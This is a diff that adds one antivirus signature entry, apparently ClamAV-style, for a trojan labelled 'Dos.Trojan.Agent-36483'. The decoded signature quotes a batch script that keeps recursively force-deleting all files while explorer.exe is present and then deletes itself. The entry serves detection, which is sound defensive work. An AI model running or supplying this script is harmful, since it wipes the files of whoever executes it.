@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36483
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :loop if exist explorer.exe ( del *.* /f /s /q goto loop ) else ( echo bye del term.bat )
